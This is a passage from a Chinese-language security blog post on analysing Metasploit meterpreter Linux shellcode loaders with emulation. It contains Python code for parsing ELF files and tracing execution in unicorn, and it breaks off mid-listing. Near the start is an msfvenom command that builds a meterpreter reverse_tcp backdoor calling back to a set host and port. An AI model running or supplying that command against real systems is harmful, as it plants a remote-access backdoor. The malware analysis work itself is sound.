    <content type="html"><![CDATA[<blockquote><p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242550" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242550</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要是通过编写一些自动化的工具来分析metepreter生成的linux平台的shellcode loader，以及解释一些常用的编码器的工作过程。</p><p><strong>本文使用的工具是 unicorn，官方版本没有执行SMC代码的能力(已经在修了)，推荐暂时使用个人patch版本<a href="https://github.com/wonderkun/unicorn" target="_blank" rel="noopener">https://github.com/wonderkun/unicorn</a></strong></p><a id="more"></a><h2 id="无编码器的metepreter-shellcode-loader"><a href="#无编码器的metepreter-shellcode-loader" class="headerlink" title="无编码器的metepreter shellcode loader"></a>无编码器的metepreter shellcode loader</h2><p>首先生成一个metepreter后门，然后用IDA分析一下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p  linux/x64/meterpreter/reverse_tcp  LHOST=192.168.7.34 LPORT=4444  -f elf &gt; tese.elf</span><br></pre></td></tr></table></figure><p>ida看一下生成的代码如下：</p><p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-25-11-38-48.png" alt=""></p><p>ida虽然对一些syscall进行了注释，但是rax被动态赋值的时候调用syscall，IDA就无能为力了，所以接下来要基于unicorn写模拟执行工具，来进行分析。</p><h3 id="0x01-加载ELF文件"><a href="#0x01-加载ELF文件" class="headerlink" title="0x01 加载ELF文件"></a>0x01 加载ELF文件</h3><p>首先先来解析ELF文件，获取可执行的segment的代码，进行加载。这一步不一定有必要做，因为你可以直接模拟执行shellcode，也可以使用IDApython直接提取代码来分析。但是我还是希望能够直接分析ELF文件，并且不依赖于IDA的辅助，所以从最基础的部分开始做起。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ELF</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,path)</span>:</span></span><br><span class="line">self.path = path</span><br><span class="line">self.fd = open(self.path,<span class="string">"rb"</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="comment"># 需要手工调用，否则会产生文件占用</span></span><br><span class="line"><span class="keyword">if</span> self.fd:</span><br><span class="line">self.fd.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFileHeader</span><span class="params">(self)</span>:</span></span><br><span class="line">elfhdr = &#123;&#125;</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">#define EI_NIDENT       16</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">unsigned char   e_ident[EI_NIDENT]; </span></span><br><span class="line"><span class="string">Elf32_Half      e_type;</span></span><br><span class="line"><span class="string">Elf32_Half      e_machine;</span></span><br><span class="line"><span class="string">Elf32_Word      e_version;</span></span><br><span class="line"><span class="string">Elf32_Addr      e_entry;</span></span><br><span class="line"><span class="string">Elf32_Off       e_phoff;</span></span><br><span class="line"><span class="string">Elf32_Off       e_shoff;</span></span><br><span class="line"><span class="string">Elf32_Word      e_flags;</span></span><br><span class="line"><span class="string">Elf32_Half      e_ehsize;</span></span><br><span class="line"><span class="string">Elf32_Half      e_phentsize;</span></span><br><span class="line"><span class="string">Elf32_Half      e_phnum;</span></span><br><span class="line"><span class="string">Elf32_Half      e_shentsize;</span></span><br><span class="line"><span class="string">Elf32_Half      e_shnum;</span></span><br><span class="line"><span class="string">Elf32_Half      e_shstrndx;</span></span><br><span class="line"><span class="string">&#125; Elf32_Ehdr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">unsigned char   e_ident[EI_NIDENT]; </span></span><br><span class="line"><span class="string">Elf64_Half      e_type;</span></span><br><span class="line"><span class="string">Elf64_Half      e_machine;</span></span><br><span class="line"><span class="string">Elf64_Word      e_version;</span></span><br><span class="line"><span class="string">Elf64_Addr      e_entry;</span></span><br><span class="line"><span class="string">Elf64_Off       e_phoff;</span></span><br><span class="line"><span class="string">Elf64_Off       e_shoff;</span></span><br><span class="line"><span class="string">Elf64_Word      e_flags;</span></span><br><span class="line"><span class="string">Elf64_Half      e_ehsize;</span></span><br><span class="line"><span class="string">Elf64_Half      e_phentsize;</span></span><br><span class="line"><span class="string">Elf64_Half      e_phnum;</span></span><br><span class="line"><span class="string">Elf64_Half      e_shentsize;</span></span><br><span class="line"><span class="string">Elf64_Half      e_shnum;</span></span><br><span class="line"><span class="string">Elf64_Half      e_shstrndx;</span></span><br><span class="line"><span class="string">&#125; Elf64_Ehdr;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">elfident = self.fd.read(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> len(elfident) !=<span class="number">16</span>:</span><br><span class="line"><span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># print( [ ord(i) for i in elfident] )</span></span><br><span class="line"></span><br><span class="line">magic = [ ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> elfident]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> magic[<span class="number">4</span>] == <span class="number">1</span>:</span><br><span class="line"><span class="comment"># ELF 32</span></span><br><span class="line">packStr = <span class="string">"&lt;2H5I6H"</span></span><br><span class="line">elfhdr[<span class="string">"mode"</span>] = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> magic[<span class="number">4</span>] == <span class="number">2</span>:</span><br><span class="line"><span class="comment"># ELF 64</span></span><br><span class="line">packStr = <span class="string">"&lt;2HI3QI6H"</span></span><br><span class="line">elfhdr[<span class="string">"mode"</span>] = <span class="number">64</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># Data</span></span><br><span class="line"><span class="keyword">return</span> &#123;&#125;</span><br><span class="line">temp = self.fd.read(struct.calcsize( packStr ))</span><br><span class="line">temp = struct.unpack(packStr,temp)</span><br><span class="line"></span><br><span class="line">elfhdr[<span class="string">'magic'</span>] = magic</span><br><span class="line">elfhdr[<span class="string">'e_type'</span>]= temp[<span class="number">0</span>]</span><br><span class="line">elfhdr[<span class="string">'e_machine'</span>] = temp[<span class="number">1</span>]</span><br><span class="line">elfhdr[<span class="string">'e_version'</span>] = temp[<span class="number">2</span>]</span><br><span class="line">elfhdr[<span class="string">'e_entry'</span>] = temp[<span class="number">3</span>]</span><br><span class="line">elfhdr[<span class="string">'e_phoff'</span>] = temp[<span class="number">4</span>]</span><br><span class="line">elfhdr[<span class="string">'e_shoff'</span>] = temp[<span class="number">5</span>]</span><br><span class="line">elfhdr[<span class="string">'e_flags'</span>] = temp[<span class="number">6</span>]</span><br><span class="line">elfhdr[<span class="string">'e_ehsize'</span>] = temp[<span class="number">7</span>]</span><br><span class="line">elfhdr[<span class="string">'e_phentsize'</span>] = temp[<span class="number">8</span>]</span><br><span class="line">elfhdr[<span class="string">'e_phnum'</span>] = temp[<span class="number">9</span>]</span><br><span class="line">elfhdr[<span class="string">'e_shentsize'</span>] = temp[<span class="number">10</span>]</span><br><span class="line">elfhdr[<span class="string">'e_shnum'</span>] = temp[<span class="number">11</span>]</span><br><span class="line">elfhdr[<span class="string">'e_shstrndx'</span>] = temp[<span class="number">12</span>]</span><br><span class="line"><span class="keyword">return</span> elfhdr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hasNoSectionInfo</span><span class="params">(self,elfhdr )</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> elfhdr:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> elfhdr[<span class="string">"e_shoff"</span>] == <span class="number">0</span> <span class="keyword">and</span> \</span><br><span class="line">elfhdr[<span class="string">"e_shnum"</span>] == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(elfhdr["e_shoff"])</span></span><br><span class="line"><span class="comment"># print( elfhdr["e_shnum"] )</span></span><br><span class="line"><span class="comment"># print( elfhdr["e_shentsize"] )</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readProgramHeader</span><span class="params">(self,elfhdr)</span>:</span></span><br><span class="line">headerSize = elfhdr[<span class="string">"e_ehsize"</span>]</span><br><span class="line">self.fd.seek(headerSize)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">Elf32_Word      p_type;</span></span><br><span class="line"><span class="string">Elf32_Off       p_offset;</span></span><br><span class="line"><span class="string">Elf32_Addr      p_vaddr;</span></span><br><span class="line"><span class="string">Elf32_Addr      p_paddr;</span></span><br><span class="line"><span class="string">Elf32_Word      p_filesz;</span></span><br><span class="line"><span class="string">Elf32_Word      p_memsz;</span></span><br><span class="line"><span class="string">Elf32_Word      p_flags;</span></span><br><span class="line"><span class="string">Elf32_Word      p_align;</span></span><br><span class="line"><span class="string">&#125; Elf32_Phdr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">Elf64_Word      p_type;</span></span><br><span class="line"><span class="string">Elf64_Word      p_flags;</span></span><br><span class="line"><span class="string">Elf64_Off       p_offset;</span></span><br><span class="line"><span class="string">Elf64_Addr      p_vaddr;</span></span><br><span class="line"><span class="string">Elf64_Addr      p_paddr;</span></span><br><span class="line"><span class="string">Elf64_Xword     p_filesz;</span></span><br><span class="line"><span class="string">Elf64_Xword     p_memsz;</span></span><br><span class="line"><span class="string">Elf64_Xword     p_align;</span></span><br><span class="line"><span class="string">&#125; Elf64_Phdr;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> elfhdr[<span class="string">"mode"</span>] == <span class="number">32</span>:</span><br><span class="line">packStr = <span class="string">"&lt;8I"</span></span><br><span class="line"><span class="keyword">elif</span> elfhdr[<span class="string">"mode"</span>] == <span class="number">64</span>:</span><br><span class="line">packStr = <span class="string">"&lt;2I6Q"</span></span><br><span class="line"></span><br><span class="line">phentsize = elfhdr[<span class="string">"e_phentsize"</span>]</span><br><span class="line">phnum = elfhdr[<span class="string">"e_phnum"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> struct.calcsize( packStr ) != phentsize :</span><br><span class="line"><span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>( phnum &gt;= <span class="number">1</span> )</span><br><span class="line"></span><br><span class="line">phHeaders = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(phnum):</span><br><span class="line"><span class="comment"># 循环读取所有的段表</span></span><br><span class="line">phHeader = &#123;&#125;</span><br><span class="line">temp = self.fd.read(struct.calcsize( packStr ))</span><br><span class="line"><span class="keyword">if</span> struct.calcsize( packStr ) != len(temp):</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">temp = struct.unpack(packStr,temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> elfhdr[<span class="string">"mode"</span>] == <span class="number">32</span>:</span><br><span class="line">phHeader[<span class="string">"p_type"</span>] = temp[<span class="number">0</span>]</span><br><span class="line">phHeader[<span class="string">"p_offset"</span>] = temp[<span class="number">1</span>]</span><br><span class="line">phHeader[<span class="string">"p_vaddr"</span>] = temp[<span class="number">2</span>]</span><br><span class="line">phHeader[<span class="string">"p_paddr"</span>] = temp[<span class="number">3</span>]</span><br><span class="line">phHeader[<span class="string">"p_filesz"</span>] = temp[<span class="number">4</span>]</span><br><span class="line">phHeader[<span class="string">"p_memsz"</span>] = temp[<span class="number">5</span>]</span><br><span class="line">phHeader[<span class="string">"p_flags"</span>] = temp[<span class="number">6</span>]</span><br><span class="line">phHeader[<span class="string">"p_align"</span>] = temp[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> elfhdr[<span class="string">"mode"</span>] == <span class="number">64</span>:</span><br><span class="line">phHeader[<span class="string">"p_type"</span>] = temp[<span class="number">0</span>]</span><br><span class="line">phHeader[<span class="string">"p_flags"</span>] = temp[<span class="number">1</span>]</span><br><span class="line">phHeader[<span class="string">"p_offset"</span>] = temp[<span class="number">2</span>]</span><br><span class="line">phHeader[<span class="string">"p_vaddr"</span>] = temp[<span class="number">3</span>]</span><br><span class="line">phHeader[<span class="string">"p_paddr"</span>] = temp[<span class="number">4</span>]</span><br><span class="line">phHeader[<span class="string">"p_filesz"</span>] = temp[<span class="number">5</span>]</span><br><span class="line">phHeader[<span class="string">"p_memsz"</span>] = temp[<span class="number">6</span>]</span><br><span class="line">phHeader[<span class="string">"p_align"</span>] = temp[<span class="number">7</span>]</span><br><span class="line">phHeaders.append( phHeader )</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> phHeaders</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFirstCode</span><span class="params">(self,elfhdr,phHeaders)</span>:</span></span><br><span class="line"><span class="comment"># 读取第一个 包含入口地址 并且可加载，可执行的段的数据</span></span><br><span class="line">entryPoint = elfhdr[<span class="string">"e_entry"</span>]</span><br><span class="line">PT_LOAD = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">PF_X = <span class="number">0x1</span> </span><br><span class="line">PF_W = <span class="number">0x2</span></span><br><span class="line">PF_R = <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">firstPh = <span class="literal">None</span></span><br><span class="line"><span class="comment"># print(phHeaders)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  phHeader <span class="keyword">in</span> phHeaders:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ( entryPoint &gt;= phHeader[<span class="string">"p_vaddr"</span>] <span class="keyword">and</span> entryPoint &lt; (phHeader[<span class="string">"p_vaddr"</span>]+phHeader[<span class="string">"p_filesz"</span>]) ):</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> phHeader[<span class="string">"p_type"</span>] == PT_LOAD <span class="keyword">and</span>\</span><br><span class="line">(phHeader[<span class="string">"p_flags"</span>] &amp; (PF_X)):</span><br><span class="line"></span><br><span class="line"><span class="comment"># rwx</span></span><br><span class="line">firstPh = phHeader</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(firstPh)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> firstPh:</span><br><span class="line">fileOff = entryPoint - firstPh[<span class="string">"p_vaddr"</span>] + phHeader[<span class="string">"p_offset"</span>]</span><br><span class="line">size = phHeader[<span class="string">"p_filesz"</span>] - ( entryPoint - firstPh[<span class="string">"p_vaddr"</span>] )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> fileOff &lt; <span class="number">0</span>  <span class="keyword">or</span> size &lt; <span class="number">0</span> :</span><br><span class="line"><span class="comment"># invalid entry point</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span></span><br><span class="line"></span><br><span class="line">self.fd.seek(fileOff)</span><br><span class="line">imageBase = firstPh[<span class="string">"p_vaddr"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> imageBase,self.fd.read( size )</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span></span><br></pre></td></tr></table></figure><p>然后从entryPoint开始进行模拟执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleEngine</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mode)</span>:</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">32</span>:</span><br><span class="line">cur_mode = CS_MODE_32</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="number">64</span>:</span><br><span class="line">cur_mode = CS_MODE_64</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">cur_mode = CS_MODE_16</span><br><span class="line"></span><br><span class="line">self.capmd = Cs(CS_ARCH_X86, cur_mode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disas_single</span><span class="params">(self, data, addr)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> self.capmd.disasm(data, addr):</span><br><span class="line">print(<span class="string">"  0x%x:\t%s\t%s"</span> % (i.address, i.mnemonic, i.op_str))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disas_all</span><span class="params">(self, data, addr)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> self.capmd.disasm(data, addr):</span><br><span class="line">print(<span class="string">"  0x%x:\t%s\t%s"</span> % (i.address, i.mnemonic, i.op_str))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(uc, addr, size, user_data)</span>:</span></span><br><span class="line">mem = uc.mem_read(addr, size)</span><br><span class="line">uc.disasm.disas_single(mem, addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if debug:</span></span><br><span class="line"><span class="comment"># print("r10:&#123;&#125;".format( hex(uc.reg_read( UC_X86_REG_R10 ) ) ))</span></span><br><span class="line"><span class="comment"># print("rcx:&#123;&#125;".format( uc.reg_read( UC_X86_REG_RCX ) ) )</span></span><br><span class="line"><span class="comment"># print("rdx:&#123;&#125;".format( uc.reg_read( UC_X86_REG_RDX ) ) )</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(bin_code,mode,imageBase,entryPoint,max_instruction=<span class="number">0</span>)</span>:</span></span><br><span class="line"><span class="keyword">global</span> write_bounds</span><br><span class="line"><span class="keyword">global</span> debug</span><br><span class="line"></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">tags = []</span><br><span class="line">write_bounds = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line">disas_engine = SimpleEngine(mode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">32</span>:</span><br><span class="line">cur_mode = UC_MODE_32</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="number">64</span>:</span><br><span class="line">cur_mode = UC_MODE_64</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">cur_mode = UC_MODE_16</span><br><span class="line"></span><br><span class="line">PAGE_SIZE = <span class="number">6</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">START_RIP = entryPoint</span><br><span class="line"></span><br><span class="line"><span class="comment"># setup engine and write the memory there.</span></span><br><span class="line">emu = Uc(UC_ARCH_X86, cur_mode)</span><br><span class="line">emu.disasm = disas_engine <span class="comment"># python is silly but it works.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print( hex(imageBase),PAGE_SIZE,mode )</span></span><br><span class="line"></span><br><span class="line">emu.mem_map(imageBase, PAGE_SIZE)</span><br><span class="line"><span class="comment"># write machine code to be emulated to memory</span></span><br><span class="line">emu.mem_write(START_RIP, bin_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write a INT 0x3 near the end of the code blob to make sure emulation ends</span></span><br><span class="line">emu.mem_write(START_RIP + len(bin_code) + <span class="number">0xff</span>, <span class="string">b"\xcc\xcc\xcc\xcc"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"><span class="comment"># emu.hook_add(UC_HOOK_MEM_READ, hook_mem_read)</span></span><br><span class="line">emu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># arbitrary address for ESP.</span></span><br><span class="line">stackBase = imageBase + PAGE_SIZE - <span class="number">1</span>*<span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">emu.reg_write(UC_X86_REG_ESP,stackBase)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> max_instruction:</span><br><span class="line">end_addr = <span class="number">-1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max_instruction = <span class="number">0x1000</span></span><br><span class="line">end_addr = len(bin_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">emu.emu_start(START_RIP, end_addr, <span class="number">0</span>, int(max_instruction))</span><br><span class="line"><span class="comment"># except UC_ERR_READ_UNMAPPED as e:</span></span><br><span class="line"><span class="comment"># # print("ERROR: %s" % e)</span></span><br><span class="line"><span class="comment"># pass</span></span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">if</span> e.errno != UC_ERR_READ_UNMAPPED:</span><br><span class="line">print(<span class="string">"ERROR: %s"</span> % e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">print(<span class="string">"rcx:&#123;&#125;"</span>.format( emu.reg_read( UC_X86_REG_RCX ) ) )</span><br><span class="line">print(<span class="string">"rbp:&#123;&#125;"</span>.format( emu.reg_read( UC_X86_REG_RBP ) ) )</span><br></pre></td></tr></table></figure><p>执行一下，就可以dump出来当前分支的所有代码，但是现在还并没有处理syscall，接下里需要添加syscall的hook，来dump syscall的参数来方便分析。</p><h3 id="0x02-syscall-参数的处理"><a href="#0x02-syscall-参数的处理" class="headerlink" title="0x02 syscall 参数的处理"></a>0x02 syscall 参数的处理</h3><p>x86_64 的syscall调用的系统调用号、参数、和系统调用号可以参考文档 <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a>。</p><p>接下里进行 syscall的hook，编写如下类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 